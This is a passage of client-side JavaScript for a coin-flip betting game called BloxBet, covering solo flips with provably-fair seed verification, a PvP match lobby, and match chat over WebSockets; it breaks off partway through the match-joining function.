/* ============================================================
   BLOXBET — COIN FLIP (solo + PvP lobby)
   ============================================================ */

(function(){
  if(typeof Auth === 'undefined'){ console.error('[coinflip] Auth missing'); return; }
  if(!Auth.isLoggedIn()){ Auth.safeRedirect('login'); return; }

  window.__coinflipLoaded = true;

  const AUDIO = {
    flip: new Audio('audio/flip.mp3'),
    win:  new Audio('audio/win.mp3'),
    lose: new Audio('audio/lose.mp3'),
    chat: new Audio('audio/chat.mp3')
  };
  Object.values(AUDIO).forEach(a => { a.preload='auto'; a.volume=0.5; });
  function playSound(name){
    try { const a = AUDIO[name]; if(!a) return; a.currentTime = 0; a.play().catch(()=>{}); } catch {}
  }

  const $  = (s) => document.querySelector(s);
  const $$ = (s) => document.querySelectorAll(s);

  function updateBalanceDisplay(amount){
    $$('[data-balance]').forEach(el => {
      el.textContent = Number(amount).toLocaleString();
      el.dataset.balance = amount;
    });
  }

  function escapeHtml(s){
    return String(s).replace(/[&<>"']/g, function(c){
      return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
    });
  }
  function fmtFull(n){ return Number(n || 0).toLocaleString(); }
  function timeAgo(ts){
    var s = Math.floor((Date.now() - ts) / 1000);
    if(s < 60) return s + 's';
    var m = Math.floor(s / 60);
    if(m < 60) return m + 'm';
    var h = Math.floor(m / 60);
    if(h < 24) return h + 'h';
    return Math.floor(h / 24) + 'd';
  }

  let userBalance = (Auth.getUser() && Number(Auth.getUser().balance)) || 0;
  updateBalanceDisplay(userBalance);

  (function(){
    const me = Auth.getUser();
    const navAvatar = document.getElementById('navAvatar');
    if(navAvatar && typeof renderAvatar === 'function') renderAvatar(navAvatar, me);
  })();

  function buildCoinEdge(){
    const edge = document.getElementById('coinEdge');
    if(!edge) return;
    edge.innerHTML = '';

    const stage = document.getElementById('coinScene');
    const width = stage ? stage.offsetWidth : 200;
    const RADIUS = width / 2;
    const THICKNESS = 24;
    const SLICES = 48;
    const sliceWidth = (2 * Math.PI * RADIUS / SLICES) + 1.5;

    for(let i = 0; i < SLICES; i++){
      const slice = document.createElement('span');
      const angle = (360 / SLICES) * i;
      slice.style.transform =
        'rotateY(' + angle + 'deg) ' +
        'translateZ(' + RADIUS + 'px) ' +
        'rotateX(90deg)';
      slice.style.width = sliceWidth + 'px';
      slice.style.marginTop = (-THICKNESS / 2) + 'px';
      slice.style.marginLeft = (-sliceWidth / 2) + 'px';
      edge.appendChild(slice);
    }
  }
  buildCoinEdge();
  window.addEventListener('resize', () => {
    clearTimeout(window._coinEdgeTimer);
    window._coinEdgeTimer = setTimeout(buildCoinEdge, 200);
  });

  let globalSocket = null;
  function ensureGlobalSocket(){
    if(globalSocket && (globalSocket.readyState === WebSocket.OPEN || globalSocket.readyState === WebSocket.CONNECTING)) return globalSocket;
    globalSocket = Auth.connectSocket();
    if(!globalSocket) return null;
    globalSocket.onmessage = (ev) => {
      try {
        const msg = JSON.parse(ev.data);
        if(msg.type === 'balance' && typeof msg.balance === 'number'){
          userBalance = msg.balance;
          Auth.updateUser({ balance: msg.balance });
          updateBalanceDisplay(msg.balance);
        } else if(msg.type === 'match_created'){
          if(mode === 'pvp') loadOpenMatches();
        } else if(msg.type === 'match_cancelled'){
          if(mode === 'pvp') loadOpenMatches();
        }
      } catch {}
    };
    return globalSocket;
  }
  ensureGlobalSocket();

  let mode = 'solo';
  const modeBar = $('#modeBar');
  if(modeBar){
    modeBar.addEventListener('click', (e) => {
      const btn = e.target.closest('button');
      if(!btn) return;
      mode = btn.dataset.mode;
      $$('#modeBar button').forEach(b => b.classList.toggle('active', b === btn));
      $('#soloMode').style.display = mode === 'solo' ? '' : 'none';
      $('#pvpMode').style.display  = mode === 'pvp'  ? '' : 'none';
      const lim = document.getElementById('limitedsMode');
      if(lim) lim.style.display = mode === 'limiteds' ? '' : 'none';
      if(mode === 'pvp') refreshPvpData();
      if(mode === 'limiteds') refreshLimiteds();
    });
  }

  /* ============ SOLO ============ */
  const coinScene    = $('#coinScene');
  const coinFlipper  = $('#coinFlipper');
  const coinShadow   = $('#coinShadow');
  const flipBtn      = $('#flipBtn');
  const betInput     = $('#betInput');
  const pickHeads    = $('#pickHeads');
  const pickTails    = $('#pickTails');
  const quickBets    = document.querySelectorAll('#soloMode .quick-bet');
  const historyStrip = $('#historyStrip');
  const historyEmpty = $('#historyEmpty');
  const flipLog      = $('#flipLog');
  const resultBanner = $('#resultBanner');
  const fairServerHash = $('#fairServerHash');
  const fairNonce    = $('#fairNonce');
  const fairLastHash = $('#fairLastHash');
  const rotateBtn    = $('#rotateBtn');
  const verifyBtn    = $('#verifyBtn');
  const recentCount  = $('#recentCount');

  let choice = 'heads';
  let flipping = false;
  let currentRotationY = 0;
  let history = [];

  function setChoice(c){
    choice = c;
    if(pickHeads) pickHeads.classList.toggle('active', c === 'heads');
    if(pickTails){
      pickTails.classList.toggle('active', c === 'tails');
      pickTails.classList.toggle('tails-active', c === 'tails');
    }
  }
  if(pickHeads) pickHeads.addEventListener('click', () => !flipping && setChoice('heads'));
  if(pickTails) pickTails.addEventListener('click', () => !flipping && setChoice('tails'));

  quickBets.forEach(btn => btn.addEventListener('click', () => {
    if(flipping) return;
    const amt = btn.dataset.amount;
    betInput.value = amt === 'max' ? Math.max(10, Math.floor(userBalance)) : amt;
  }));

  let bannerTimer = null;
  function showBanner(text, type){
    if(!resultBanner) return;
    resultBanner.className = 'result-banner ' + type;
    resultBanner.textContent = text;
    void resultBanner.offsetWidth;
    resultBanner.classList.add('show');
    clearTimeout(bannerTimer);
    bannerTimer = setTimeout(() => resultBanner.classList.remove('show'), 2600);
  }

  function spinCoin(landedOn, onDone){
    if(!coinFlipper) return;

    const spins = 6 + Math.floor(Math.random() * 3);
    const target = landedOn === 'tails' ? 180 : 0;
    const base = currentRotationY - (currentRotationY % 360);
    currentRotationY = base + spins * 360 + target;
    const jitter = (Math.random() - 0.5) * 6;
    const finalRot = currentRotationY + jitter;

    coinScene.classList.remove('idle', 'win', 'lose', 'shine');
    coinFlipper.classList.add('spinning');

    const anim = coinFlipper.animate([
      { transform: 'translateY(0) rotateY(0deg) rotateX(0deg)', offset: 0 },
      { transform: 'translateY(-40px) rotateY(' + (currentRotationY * 0.15) + 'deg) rotateX(6deg)', offset: 0.15 },
      { transform: 'translateY(-120px) rotateY(' + (currentRotationY * 0.45) + 'deg) rotateX(-4deg)', offset: 0.35 },
      { transform: 'translateY(-70px) rotateY(' + (currentRotationY * 0.72) + 'deg) rotateX(2deg)', offset: 0.60 },
      { transform: 'translateY(-10px) rotateY(' + (currentRotationY * 0.94) + 'deg) rotateX(0deg)', offset: 0.85 },
      { transform: 'translateY(-14px) rotateY(' + (finalRot * 0.99) + 'deg)', offset: 0.95 },
      { transform: 'translateY(0) rotateY(' + finalRot + 'deg)', offset: 1 }
    ], {
      duration: 2300,
      easing: 'cubic-bezier(.22,.61,.36,1)',
      fill: 'forwards'
    });

    if(coinShadow){
      coinShadow.animate([
        { transform: 'translateX(-50%) scale(1)', opacity: 0.55, offset: 0 },
        { transform: 'translateX(-50%) scale(.5)', opacity: 0.15, offset: 0.35 },
        { transform: 'translateX(-50%) scale(1)', opacity: 0.55, offset: 1 }
      ], {
        duration: 2300,
        easing: 'cubic-bezier(.22,.61,.36,1)',
        fill: 'forwards'
      });
    }

    anim.onfinish = () => {
      coinFlipper.style.transform = 'translateY(0) rotateY(' + finalRot + 'deg)';
      coinFlipper.classList.remove('spinning');
      coinScene.classList.add('idle');
      coinScene.classList.add('shine');
      setTimeout(() => coinScene.classList.remove('shine'), 700);
      onDone && onDone();
    };
  }

  async function doFlip(){
    if(flipping) return;
    const bet = parseInt(betInput.value, 10);
    if(!Number.isFinite(bet) || bet < 10){ Toast.error('Invalid bet','Minimum is 10 RoCoins.'); return; }
    if(bet > userBalance){ Toast.error('Not enough RoCoins','You have ' + userBalance.toLocaleString() + '.'); return; }

    flipping = true;
    flipBtn.disabled = pickHeads.disabled = pickTails.disabled = betInput.disabled = true;
    quickBets.forEach(b => b.disabled = true);
    playSound('flip');

    const clientSeed = (crypto && crypto.getRandomValues)
      ? Array.from(crypto.getRandomValues(new Uint8Array(8))).map(b => b.toString(16).padStart(2,'0')).join('')
      : Math.random().toString(36).slice(2);

    let result = null;
    let lastHash = null;
    let unlockedList = [];

    try {
      const res = await Auth.api('/game/coinflip', {
        method: 'POST',
        body: JSON.stringify({ bet, choice, clientSeed })
      });
      if(!res.ok){
        let err = 'FLIP_FAILED';
        try { const j = await res.json(); err = j.error || err; } catch {}
        const msg = {
          INSUFFICIENT_BALANCE: 'Not enough RoCoins.',
          INVALID_BET: 'Invalid bet.',
          BET_OUT_OF_RANGE: 'Minimum bet is 10 RoCoins.',
          RATE_LIMITED: 'Slow down a little.'
        }[err] || err;
        throw new Error(msg);
      }
      const data = await res.json();
      result = data.flip.result;
      lastHash = data.flip.hash;
      userBalance = data.balance;
      unlockedList = data.unlocked || [];
      Auth.updateUser({ balance: userBalance });
    } catch (err) {
      flipping = false;
      flipBtn.disabled = pickHeads.disabled = pickTails.disabled = betInput.disabled = false;
      quickBets.forEach(b => b.disabled = false);
      Toast.error('Flip failed', err.message || 'Try again.');
      if(coinScene) coinScene.classList.add('idle');
      return;
    }

    spinCoin(result, () => {
      updateBalanceDisplay(userBalance);
      const won = result === choice;
      if(won){
        coinScene.classList.add('win');
        showBanner('You won +' + Math.floor(bet * 0.96) + ' RoCoins', 'win');
        playSound('win');
        Toast.success(result === 'heads' ? 'Heads!' : 'Tails!', 'You won ' + Math.floor(bet * 1.96).toLocaleString() + ' RoCoins.');
      } else {
        coinScene.classList.add('lose');
        showBanner('You lost ' + bet + ' RoCoins', 'lose');
        playSound('lose');
        Toast.error(result === 'heads' ? 'Heads.' : 'Tails.', 'You lost ' + bet.toLocaleString() + ' RoCoins.');
      }

      unlockedList.forEach(a => {
        setTimeout(() => Toast.info('Achievement unlocked', a.name + ' — ' + a.desc), 500);
      });

      history.unshift({ result, won, bet, choice, hash: lastHash, timestamp: Date.now() });
      if(history.length > 20) history.length = 20;
      renderHistory();
      renderFlipLog();
      if(fairLastHash) fairLastHash.textContent = lastHash ? lastHash.slice(0,16) + '…' : '—';
      refreshFairInfo();

      flipping = false;
      flipBtn.disabled = pickHeads.disabled = pickTails.disabled = betInput.disabled = false;
      quickBets.forEach(b => b.disabled = false);
    });
  }

  if(flipBtn) flipBtn.addEventListener('click', doFlip);

  document.addEventListener('keydown', (e) => {
    if(mode !== 'solo') return;
    if(flipping) return;
    if(e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT')) return;
    const k = e.key.toLowerCase();
    if(k === 'h') setChoice('heads');
    else if(k === 't') setChoice('tails');
    else if(e.code === 'Space'){ e.preventDefault(); doFlip(); }
  });

  function renderHistory(){
    if(!historyStrip) return;
    historyStrip.querySelectorAll('.history-chip').forEach(el => el.remove());
    if(history.length === 0){
      if(historyEmpty) historyEmpty.style.display = '';
      if(recentCount) recentCount.textContent = '0';
      return;
    }
    if(historyEmpty) historyEmpty.style.display = 'none';
    history.forEach(f => {
      const chip = document.createElement('div');
      chip.className = 'history-chip ' + f.result + (f.won ? ' win' : ' lose');
      chip.innerHTML = '<img src="icons/coin-' + f.result + '.png" alt="' + f.result + '" draggable="false">';
      historyStrip.appendChild(chip);
    });
    if(recentCount) recentCount.textContent = history.length;
  }

  function renderFlipLog(){
    if(!flipLog) return;
    flipLog.innerHTML = '';
    if(history.length === 0){
      flipLog.innerHTML = '<div class="side-empty">Your recent flips will appear here.</div>';
      return;
    }
    history.slice(0, 15).forEach(f => {
      const row = document.createElement('div');
      row.className = 'flip-log-row';
      const net = f.won ? Math.floor(f.bet * 0.96) : -f.bet;
      const coinSrc = 'icons/coin-' + f.result + '.png';
      row.innerHTML =
        '<div class="left">' +
          '<img src="' + coinSrc + '" alt="' + f.result + '" class="flip-log-coin" draggable="false">' +
          '<span>' + (f.result === 'heads' ? 'Heads' : 'Tails') + '</span>' +
          '<span class="bet">· ' + f.bet.toLocaleString() + '</span>' +
        '</div>' +
        '<div class="net ' + (f.won ? 'win' : 'lose') + '">' + (f.won ? '+' : '') + net.toLocaleString() + '</div>';
      flipLog.appendChild(row);
    });
  }

  async function refreshFairInfo(){
    try {
      const res = await Auth.api('/game/coinflip/fair');
      if(!res.ok) return;
      const data = await res.json();
      if(data.serverSeedHash && fairServerHash){
        fairServerHash.textContent = data.serverSeedHash.slice(0,16) + '…';
        fairServerHash.title = data.serverSeedHash;
      }
      if(typeof data.nonce === 'number' && fairNonce) fairNonce.textContent = data.nonce;
    } catch {}
  }

  if(rotateBtn) rotateBtn.addEventListener('click', async () => {
    if(flipping) return;
    rotateBtn.disabled = true;
    try {
      const res = await Auth.api('/game/coinflip/rotate', { method: 'POST' });
      if(!res.ok) throw new Error('Rotation failed');
      const data = await res.json();
      Toast.success('Seed rotated', 'Copy the revealed seed below to verify past flips.');
      openVerifyModal(data.revealedSeed);
      refreshFairInfo();
    } catch (err) {
      Toast.error('Could not rotate', err.message || 'Try again.');
    } finally {
      rotateBtn.disabled = false;
    }
  });

  if(verifyBtn) verifyBtn.addEventListener('click', () => openVerifyModal(null));

  const fairSeedInput = $('#fairSeedInput');
  const fairFlipSelect = $('#fairFlipSelect');
  const fairResults = $('#fairResults');
  const fairStatus = $('#fairStatus');
  const fairVerifyBtn = $('#fairVerifyBtn');

  async function openVerifyModal(prefillSeed){
    try {
      const res = await Auth.api('/game/coinflip/history');
      if(res.ok){
        const data = await res.json();
        fairFlipSelect.innerHTML = '<option value="">— Choose a flip —</option>';
        data.history.forEach((h, i) => {
          const opt = document.createElement('option');
          opt.value = i;
          const dt = new Date(h.timestamp).toLocaleTimeString();
          opt.textContent = dt + ' · ' + h.result.toUpperCase() + ' · bet ' + h.bet + ' · nonce ' + h.nonce;
          opt.dataset.flip = JSON.stringify(h);
          fairFlipSelect.appendChild(opt);
        });
      }
    } catch {}
    if(prefillSeed) fairSeedInput.value = prefillSeed;
    fairResults.style.display = 'none';
    fairStatus.className = 'auth-status';
    Modal.open('m-fair');
  }

  async function sha256Hex(str){
    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
  }

  async function hmacSha256Hex(key, msg){
    const cryptoKey = await crypto.subtle.importKey(
      'raw', new TextEncoder().encode(key),
      { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
    );
    const sig = await crypto.subtle.sign('HMAC', cryptoKey, new TextEncoder().encode(msg));
    return Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2,'0')).join('');
  }

  if(fairVerifyBtn) fairVerifyBtn.addEventListener('click', async () => {
    const seed = fairSeedInput.value.trim();
    if(!seed){ fairStatus.className='auth-status show error'; fairStatus.textContent='Paste the seed.'; return; }
    const opt = fairFlipSelect.selectedOptions[0];
    if(!opt || !opt.dataset.flip){ fairStatus.className='auth-status show error'; fairStatus.textContent='Pick a flip.'; return; }
    const flip = JSON.parse(opt.dataset.flip);

    const computedHash = await sha256Hex(seed);
    const hashMatch = computedHash === flip.serverSeedHash;
    const hmacHash = await hmacSha256Hex(seed, flip.clientSeed + ':' + flip.nonce);
    const computedResult = parseInt(hmacHash.slice(0,8), 16) % 2 === 0 ? 'heads' : 'tails';
    const resultMatch = computedResult === flip.result;

    $('#fvHash').textContent = flip.serverSeedHash;
    $('#fvComputed').textContent = computedHash;
    $('#fvHashMatch').innerHTML = hashMatch
      ? '<span style="color:#4ade80;font-weight:600">✓ Match</span>'
      : '<span style="color:#f87171;font-weight:600">✗ Mismatch</span>';
    $('#fvClient').textContent = flip.clientSeed;
    $('#fvNonce').textContent = flip.nonce;
    $('#fvResult').textContent = computedResult;
    $('#fvActual').textContent = flip.result;
    $('#fvStatus').innerHTML = resultMatch
      ? '<span style="color:#4ade80;font-weight:600">✓ Verified</span>'
      : '<span style="color:#f87171;font-weight:600">✗ Mismatch</span>';

    fairResults.style.display = 'block';
    fairStatus.className = 'auth-status show ' + (hashMatch && resultMatch ? 'success' : 'error');
    fairStatus.textContent = hashMatch && resultMatch ? 'Verified — the flip was fair.' : 'Verification failed.';
  });

  /* ============ PVP LOBBY ============ */
  const pvpMatchesEl  = $('#pvpMatches');
  const pvpRecentEl   = $('#pvpRecent');
  const pvpFiltersEl  = $('#pvpFilters');

  const pvpCreateModalBtn = $('#pvpCreateBtn');
  const pvpConfirmCreate  = $('#pvpConfirmCreate');
  const pvpPickHeads      = $('#pvpPickHeads');
  const pvpPickTails      = $('#pvpPickTails');
  const pvpBetInput       = $('#pvpBetInput');
  const pvpQuickBets      = document.querySelectorAll('#pvpCreateView .quick-bet');
  const pvpCreateView     = $('#pvpCreateView');
  const pvpWaitView       = $('#pvpWaitView');
  const pvpResultView     = $('#pvpResultView');
  const pvpWaitDetails    = $('#pvpWaitDetails');
  const pvpCancelBtn      = $('#pvpCancelBtn');
  const pvpPlayAgain      = $('#pvpPlayAgain');
  const pvpChatMessages   = $('#pvpChatMessages');
  const pvpChatInput      = $('#pvpChatInput');
  const pvpChatSend       = $('#pvpChatSend');
  const pvpResultTitle    = $('#pvpResultTitle');
  const pvpResultSub      = $('#pvpResultSub');

  let pvpChoice = 'heads';
  let myOpenMatchId = null;
  let matchSocket = null;
  let openMatchesCache = [];
  let currentFilter = 'all';

  function setPvpChoice(c){
    pvpChoice = c;
    if(pvpPickHeads) pvpPickHeads.classList.toggle('active', c === 'heads');
    if(pvpPickTails) pvpPickTails.classList.toggle('active', c === 'tails');
  }
  if(pvpPickHeads) pvpPickHeads.addEventListener('click', () => setPvpChoice('heads'));
  if(pvpPickTails) pvpPickTails.addEventListener('click', () => setPvpChoice('tails'));

  pvpQuickBets.forEach(btn => btn.addEventListener('click', () => {
    const amt = btn.dataset.pvpAmount;
    pvpBetInput.value = amt === 'max' ? Math.max(10, Math.floor(userBalance)) : amt;
  }));

  if(pvpCreateModalBtn){
    pvpCreateModalBtn.addEventListener('click', () => {
      pvpCreateView.style.display = '';
      pvpWaitView.style.display = 'none';
      pvpResultView.style.display = 'none';
      Modal.open('m-createMatch');
    });
  }

  if(pvpConfirmCreate){
    pvpConfirmCreate.addEventListener('click', async () => {
      const bet = parseInt(pvpBetInput.value, 10);
      if(!Number.isFinite(bet) || bet < 10){ Toast.error('Invalid bet','Minimum is 10 RoCoins.'); return; }
      if(bet > userBalance){ Toast.error('Not enough RoCoins','You have ' + userBalance.toLocaleString() + '.'); return; }

      pvpConfirmCreate.disabled = true;
      pvpConfirmCreate.innerHTML = '<div class="spinner"></div><span>Creating…</span>';

      try {
        const res = await Auth.api('/pvp/coinflip/create', {
          method: 'POST',
          body: JSON.stringify({ bet, choice: pvpChoice })
        });
        if(!res.ok){
          let err = 'CREATE_FAILED';
          try { const j = await res.json(); err = j.error || err; } catch {}
          throw new Error(err);
        }
        const data = await res.json();
        myOpenMatchId = data.match.id;
        userBalance = data.balance;
        Auth.updateUser({ balance: userBalance });
        updateBalanceDisplay(userBalance);

        pvpCreateView.style.display = 'none';
        pvpResultView.style.display = 'none';
        pvpWaitView.style.display = '';

        renderWaitDetails(data.match);
        Toast.success('Match created', 'Waiting for an opponent…');
        openMatchSocket(myOpenMatchId);
        loadChat(myOpenMatchId);
        refreshPvpData();
      } catch (err) {
        Toast.error('Could not create match', err.message || 'Try again.');
      } finally {
        pvpConfirmCreate.disabled = false;
        pvpConfirmCreate.innerHTML = '<img src="icons/users.png" alt="" class="ico" draggable="false"><span>Create Match</span>';
      }
    });
  }

  function renderWaitDetails(m){
    if(!pvpWaitDetails) return;
    var side = m.creatorChoice || m.side || 'heads';
    var sideImg = side === 'tails' ? 'icons/coin-tails.png' : 'icons/coin-heads.png';
    var av = (typeof resolveAvatarUrl === 'function')
      ? resolveAvatarUrl({ avatar: m.creatorAvatar, id: m.creatorId })
      : m.creatorAvatar;
    var initial = ((m.creatorUsername||'U')[0]||'U').toUpperCase();
    var avHtml = av
      ? '<img src="'+av+'" alt="" referrerpolicy="no-referrer" onerror="this.remove()">'
      : initial;
    pvpWaitDetails.innerHTML =
      '<div class="pvp-duel">' +
        '<div class="pvp-duel-side">' +
          '<div class="pvp-duel-av">' + avHtml + '</div>' +
          '<div class="pvp-duel-name">' + escapeHtml(m.creatorUsername||'You') + '</div>' +
          '<div class="pvp-duel-bet">' + fmtFull(m.bet) + ' RC</div>' +
          '<div class="pvp-duel-choice">' + escapeHtml(side) + '</div>' +
        '</div>' +
        '<div class="pvp-duel-coin"><img src="'+sideImg+'" alt="" draggable="false"></div>' +
        '<div class="pvp-duel-side">' +
          '<div class="pvp-duel-av empty" style="border-style:dashed">?</div>' +
          '<div class="pvp-duel-name" style="color:var(--text-3)">Waiting…</div>' +
          '<div class="pvp-duel-bet">' + fmtFull(m.bet) + ' RC</div>' +
        '</div>' +
      '</div>';
  }

  function openMatchSocket(matchId){
    closeMatchSocket();
    matchSocket = Auth.connectSocket(matchId);
    if(!matchSocket) return;
    matchSocket.onmessage = (ev) => {
      try {
        const msg = JSON.parse(ev.data);
        if(msg.type === 'match_resolved'){
          const myId = String(Auth.getUser().id);
          const won = msg.match.winnerId === myId;
          Auth.refreshUser().then(me => { if(me) updateBalanceDisplay(me.balance); });
          if(myOpenMatchId === matchId) closeMatchSocket();
          myOpenMatchId = null;
          showPvpResult(msg.match, won);
          if(won) playSound('win'); else playSound('lose');
          refreshPvpData();
        } else if(msg.type === 'chat'){
          appendChat(msg.chat);
        }
      } catch {}
    };
  }

  function closeMatchSocket(){
    if(matchSocket){
      try { matchSocket.close(); } catch {}
      matchSocket = null;
    }
  }

  async function loadChat(matchId){
    try {
      const res = await Auth.api('/pvp/coinflip/' + matchId + '/chat');
      if(!res.ok) return;
      const data = await res.json();
      if(pvpChatMessages){
        pvpChatMessages.innerHTML = '';
        data.messages.forEach(appendChat);
        scrollChat();
      }
    } catch {}
  }

  function appendChat(c){
    if(!pvpChatMessages) return;
    const div = document.createElement('div');
    div.className = 'chat-msg';
    const isMe = String(c.userId) === String(Auth.getUser().id);
    div.innerHTML =
      '<div class="chat-meta">' +
        '<span class="chat-name" style="color:' + (isMe ? 'var(--accent)' : 'var(--text-2)') + '">' + escapeHtml(c.username) + '</span>' +
        '<span class="chat-time">' + new Date(c.timestamp).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'}) + '</span>' +
      '</div>' +
      '<div class="chat-body">' + escapeHtml(c.message) + '</div>';
    pvpChatMessages.appendChild(div);
    scrollChat();
    if(!isMe) playSound('chat');
  }

  function scrollChat(){ if(pvpChatMessages) pvpChatMessages.scrollTop = pvpChatMessages.scrollHeight; }

  async function sendChatMessage(){
    const text = pvpChatInput.value.trim();
    if(!text || !myOpenMatchId) return;
    pvpChatInput.value = '';
    try {
      await Auth.api('/pvp/coinflip/' + myOpenMatchId + '/chat', {
        method: 'POST',
        body: JSON.stringify({ message: text })
      });
    } catch {}
  }
  if(pvpChatSend) pvpChatSend.addEventListener('click', sendChatMessage);
  if(pvpChatInput) pvpChatInput.addEventListener('keydown', (e) => {
    if(e.key === 'Enter'){ e.preventDefault(); sendChatMessage(); }
  });

  async function refreshPvpData(){
    await Promise.all([loadOpenMatches(), loadRecentMatches()]);
  }

  async function loadOpenMatches(){
    try {
      const res = await Auth.api('/pvp/coinflip/matches');
      if(!res.ok) return;
      const data = await res.json();
      openMatchesCache = data.matches || [];
      renderOpenMatches();
    } catch {}
  }

  function filterMatches(list){
    if(currentFilter === 'all') return list;
    if(currentFilter === 'mine'){
      const myId = Auth.getUser() ? String(Auth.getUser().id) : '';
      return list.filter(m => m.creatorId === myId);
    }
    if(currentFilter === 'low')  return list.filter(m => m.bet < 500);
    if(currentFilter === 'mid')  return list.filter(m => m.bet >= 500 && m.bet < 5000);
    if(currentFilter === 'high') return list.filter(m => m.bet >= 5000);
    return list;
  }

  function renderOpenMatches(){
    if(!pvpMatchesEl) return;

    const filtered = filterMatches(openMatchesCache);
    const myId = Auth.getUser() ? String(Auth.getUser().id) : '';

    if(filtered.length === 0){
      pvpMatchesEl.innerHTML =
        '<div class="pvp-empty">' +
          '<div class="icon"><img src="icons/users.png" alt="" class="ico" draggable="false"></div>' +
          '<h4>' + (currentFilter === 'all' ? 'No open matches' : 'Nothing in this range') + '</h4>' +
          '<p>' + (currentFilter === 'all' ? 'Be the first to create one.' : 'Try a different filter.') + '</p>' +
          '<button class="pvp-create-btn" onclick="document.getElementById(\'pvpCreateBtn\').click()">' +
            '<img src="icons/plus.png" alt="" class="ico" draggable="false">' +
            '<span>Create Match</span>' +
          '</button>' +
        '</div>';
      return;
    }

    pvpMatchesEl.innerHTML = '';
    filtered.forEach(m => {
      const isOwn = m.creatorId === myId;
      const card = document.createElement('div');
      card.className = 'pvp-match' + (isOwn ? ' own' : '');

      const initial = (m.creatorUsername || 'U')[0].toUpperCase();
      var avUrl = (typeof resolveAvatarUrl === 'function')
        ? resolveAvatarUrl({ avatar: m.creatorAvatar, id: m.creatorId })
        : m.creatorAvatar;
      const avatarHtml = (avUrl && (String(avUrl).indexOf('/api/avatar/') === 0 || /^https?:/i.test(avUrl)))
        ? '<img src="' + avUrl + '" alt="" draggable="false" referrerpolicy="no-referrer" onerror="this.style.display=\'none\';this.parentNode.textContent=\'' + initial + '\'">'
        : initial;

      const side = m.side || 'heads';
      const sideImg = side === 'tails' ? 'icons/coin-tails.png' : 'icons/coin-heads.png';
      const oppSide = side === 'heads' ? 'tails' : 'heads';
      const oppImg = oppSide === 'tails' ? 'icons/coin-tails.png' : 'icons/coin-heads.png';
      const bet = Number(m.bet) || 0;
      const rangeLo = Math.floor(bet * 0.95);
      const rangeHi = Math.ceil(bet * 1.05);

      const actions = isOwn
        ? '<button type="button" class="pvp-view-btn" data-view="' + m.id + '">View</button>' +
          '<span class="pvp-match-own-tag">Yours</span>'
        : '<button type="button" class="pvp-join-btn">Join</button>' +
          '<button type="button" class="pvp-view-btn" data-view="' + m.id + '">View</button>';

      card.innerHTML =
        '<div class="pvp-row-players">' +
          '<div class="pvp-player" data-user-id="' + (m.creatorId || '') + '">' +
            '<div class="pvp-player-av">' + avatarHtml +
              '<span class="pvp-side-badge ' + side + '"><img src="' + sideImg + '" alt="" draggable="false"></span>' +
            '</div>' +
            '<div class="pvp-player-name">' + escapeHtml(m.creatorUsername || 'Player') + '</div>' +
          '</div>' +
          '<div class="pvp-vs">VS</div>' +
          '<div class="pvp-player open">' +
            '<div class="pvp-player-av empty">' +
              '<img src="' + oppImg + '" class="pvp-side-preview" alt="" draggable="false">' +
            '</div>' +
            '<div class="pvp-player-name muted">Waiting…</div>' +
          '</div>' +
        '</div>' +
        '<div class="pvp-row-coin">' +
          '<img src="' + sideImg + '" alt="' + side + '" class="pvp-coin-lg" draggable="false">' +
        '</div>' +
        '<div class="pvp-row-value">' +
          '<div class="pvp-pot"><img src="icons/coin.png" alt="" class="pvp-gem" draggable="false">' + fmtFull(bet) + '</div>' +
          '<div class="pvp-range">' + fmtFull(rangeLo) + ' – ' + fmtFull(rangeHi) + '</div>' +
        '</div>' +
        '<div class="pvp-row-actions">' + actions + '</div>';

      pvpMatchesEl.appendChild(card);

      const joinBtn = card.querySelector('.pvp-join-btn');
      if(joinBtn) joinBtn.addEventListener('click', () => joinMatch(m.id, joinBtn));
      card.querySelectorAll('[data-view]').forEach(function(b){
        b.addEventListener('click', function(){
          if(typeof window.openMatchView === 'function') window.openMatchView(m);
          else if(isOwn) showWaitingModal(m);
        });
      });
    });
  }

  if(pvpFiltersEl){
    pvpFiltersEl.addEventListener('click', (e) => {
      const btn = e.target.closest('.pvp-filter');
      if(!btn) return;
      pvpFiltersEl.querySelectorAll('.pvp-filter').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      currentFilter = btn.dataset.filter;
      renderOpenMatches();
    });
  }

  async function loadRecentMatches(){
    if(!pvpRecentEl) return;
    try {
      const res = await Auth.api('/pvp/coinflip/recent');
      if(!res.ok) return;
      const data = await res.json();
      const rows = (data.matches || []).slice(0, 6);

      if(rows.length === 0){
        pvpRecentEl.innerHTML = '<div class="pvp-recent-item" style="grid-column:1/-1;justify-content:center;color:var(--text-3)">No recent matches.</div>';
        return;
      }

      pvpRecentEl.innerHTML = '';
      rows.forEach(m => {
        const winner = m.winnerId === m.creatorId ? m.creatorUsername : (m.joinerUsername || '?');
        const loser  = m.winnerId === m.creatorId ? (m.joinerUsername || '?') : m.creatorUsername;
        const item = document.createElement('div');
        item.className = 'pvp-recent-item';
        item.innerHTML =
          '<img src="icons/coin-' + (m.result || 'heads') + '.png" alt="" draggable="false">' +
          '<span class="pvp-recent-name">' + escapeHtml(winner) + ' beat ' + escapeHtml(loser) + '</span>' +
          '<span class="pvp-recent-net">+' + fmtFull(Math.floor(m.bet * 0.96)) + '</span>';
        pvpRecentEl.appendChild(item);
      });
    } catch {}
  }

  async function joinMatch(matchId, btn){
    btn.disabled = true;
    btn.textContent = 'Joining…';

    try {
      const res = await Auth.api('/pvp/coinflip/join/' + matchId, { method: 'POST' });
      if(!res.ok){
        let err = 'JOIN_FAILED';
        try { const j = await res.json(); err = j.error || err; } catch {}
        const msg = {
          INSUFFICIENT_BALANCE: 'Not enough RoCoins.',
          MATCH_NOT_OPEN: 'Someone already joined.',
          MATCH_ALREADY_JOINED: 'Someone already joined.',
          CANNOT_JOIN_OWN: 'That is your own match.'
        }[err] || err;
        throw new Error(msg);
      }
      const data = await res.json();
      userBalance = data.balance;
      Auth.updateUser({ balance: userBalance });
      updateBalanceDisplay(userBalance);

      (data.unlocked || []).forEach(a => {
        setTimeout(() => Toast.info('Achievement unlocked', a.name + ' — ' + a.desc), 500);
      });

